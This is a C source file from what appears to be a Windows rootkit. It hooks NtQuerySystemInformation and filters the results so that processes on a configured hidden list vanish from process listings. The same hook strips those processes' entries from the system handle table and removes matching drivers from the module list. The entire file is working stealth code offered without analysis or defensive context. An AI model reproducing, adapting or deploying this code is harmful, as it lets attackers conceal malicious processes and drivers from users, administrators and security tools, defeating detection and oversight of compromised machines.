#include <winsock2.h>
#include <windows.h>
#include <time.h>
#include "ntdll.h"

#include "config.h"

#include "ntquerysysteminformation.h"

NTSTATUS WINAPI NewNtQuerySystemInformation(
       ULONG SystemInformationClass,
       PVOID SystemInformation,
       ULONG SystemInformationLength,
       PULONG ReturnLength
)
{
  NTSTATUS rc;
	 
	 // call original function
     rc=OldNtQuerySystemInformation(SystemInformationClass,SystemInformation,SystemInformationLength,ReturnLength);
     if(NT_SUCCESS(rc)) 
     {
		if(SystemProcessInformation==SystemInformationClass)
        {
			// Processes

			int iChanged=0;
			ANSI_STRING asProcessName;
			struct _SYSTEM_PROCESS_INFORMATION *curr=(struct _SYSTEM_PROCESS_INFORMATION*)SystemInformation;
			struct _SYSTEM_PROCESS_INFORMATION *prev=NULL;
    						
            while(curr)
            {       
                RtlUnicodeStringToAnsiString(&asProcessName,&(curr->usName),TRUE);
                if((asProcessName.Length>0)&&(asProcessName.Length<255))
                {
					if (config_CheckString(ConfigHiddenProcess,asProcessName.Buffer,asProcessName.Length))
					{
                        iChanged=1;

						if(prev)
                        {
							if(curr->dNext)
                                // make prev skip this entry
								prev->dNext+=curr->dNext;
                            else
                                // we are last, so make prev the end
                                prev->dNext=0;
                        }
                        else
						{
                            if(curr->dNext)
                                 // we are first in the list, so move it forward
                                 (char *)SystemInformation+=curr->dNext;
                            else
                                 // we are the only process!
                                 SystemInformation=NULL;
                        }
                    }
                }
				RtlFreeAnsiString(&asProcessName);
                                
				if (iChanged==0) 
					prev=curr;
				else iChanged=0;

                if(curr->dNext) 
					((char *)curr+=curr->dNext);
                else curr=NULL;
            }
        }
		else if (SystemHandleInformation==SystemInformationClass) //SystemHandleInformation
		{
			// Handles

			ULONG ulCount,NumRec;
			BOOL bFound;
			ANSI_STRING asProcessName;

			NTSTATUS ntStatus;
			DWORD dwLen=1024,dwLastPid=-1,dwFree=0;
			PBYTE pProcessInfo=NULL;
			PSYSTEM_PROCESS_INFORMATION pSysProc;
			OBJECT_ATTRIBUTES oa={sizeof(oa)};
			
			struct _SYSTEM_HANDLE_INFORMATION* shiex=(struct _SYSTEM_HANDLE_INFORMATION*)SystemInformation;
			struct _SYSTEM_HANDLE* shi=(struct _SYSTEM_HANDLE*)shiex->Information;
			ULONG Size=sizeof(SYSTEM_HANDLE);
			
			NumRec=shiex->NumberOfHandles; // Number of system_handles in the buffer.

			// create start buffer
			if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(),&pProcessInfo,0,&dwLen,MEM_COMMIT|MEM_TOP_DOWN,PAGE_READWRITE)))
				return rc;
	
			// get the full real process & thread list
			while ((ntStatus=OldNtQuerySystemInformation(5,pProcessInfo,dwLen,NULL))==STATUS_INFO_LENGTH_MISMATCH)
			{
				NtFreeVirtualMemory(NtCurrentProcess(),&pProcessInfo,&dwFree,MEM_RELEASE);
				dwLen+=1024;
				pProcessInfo=NULL;

				if (!NT_SUCCESS(NtAllocateVirtualMemory(NtCurrentProcess(),&pProcessInfo,0,&dwLen,MEM_COMMIT|MEM_TOP_DOWN,PAGE_READWRITE)))
					return rc;
			}

			if (!NT_SUCCESS(ntStatus))
			{
				NtFreeVirtualMemory(NtCurrentProcess(),&pProcessInfo,&dwFree,MEM_RELEASE);
				return rc;
			}
						
			for (ulCount=0;ulCount<NumRec;ulCount++)
			{				
				if (dwLastPid!=shi->uIdProcess)
				{
					bFound=FALSE;
					dwLastPid=shi->uIdProcess;
					
					pSysProc=(PSYSTEM_PROCESS_INFORMATION)pProcessInfo;
					while(1)
					{
						if (pSysProc->dUniqueProcessId==shi->uIdProcess)
						{
							RtlUnicodeStringToAnsiString(&asProcessName,&pSysProc->usName,TRUE);
							bFound=config_CheckString(ConfigHiddenProcess,asProcessName.Buffer,asProcessName.Length);
							RtlFreeAnsiString(&asProcessName);
							break;
						}
			
						if (pSysProc->dNext) 
							pSysProc=(PSYSTEM_PROCESS_INFORMATION)((char*)pSysProc+pSysProc->dNext);
						else 
							break;
					}
				}
									    				       				
	       		if (bFound)
	       		{	// Hide it
	       			RtlCopyMemory((char*)shi,(char*)shi+Size,Size*(NumRec-(ulCount+1))); // hide handle
        			RtlZeroMemory((char*)shi+Size*(NumRec-(ulCount+1)),Size); // delete last row
        			shiex->NumberOfHandles--; // change number of handles
        		}
        		else 
        			shi++; // next SYSTEM_HANDLE record
			}

			// free process info
			NtFreeVirtualMemory(NtCurrentProcess(),&pProcessInfo,&dwFree,MEM_RELEASE);
		}
		else if (SystemModuleInformation==SystemInformationClass) // SystemModuleInformation (Drivers)
		{
			// Drivers

			ULONG ulCount,ulNumRec=(ULONG)*((ULONG*)SystemInformation),ulSize=sizeof(SYSTEM_MODULE);
			PULONG pulNumRec=(ULONG*)SystemInformation;
			PSYSTEM_MODULE psmi=(PSYSTEM_MODULE)((CHAR*)SystemInformation+sizeof(ULONG));
			
			for (ulCount=0;ulCount<ulNumRec;ulCount++)
			{
				// Check if we need to hide it
				
				if (config_CheckString(ConfigHiddenProcess,psmi->ImageName+psmi->ModuleNameOffset,0))
				{
            		// Hide it
	       			RtlCopyMemory((char*)psmi,(char*)psmi+ulSize,ulSize*(ulNumRec-(ulCount+1))); // hide handle
        			RtlZeroMemory((char*)psmi+ulSize*(ulNumRec-(ulCount+1)),ulSize); // delete last row
        			(*pulNumRec)--; // change number of modules
            	}
            	else
            		psmi++;	// Next SYSTEM_MODULE record
			}
		}
	 }

	 return rc;
}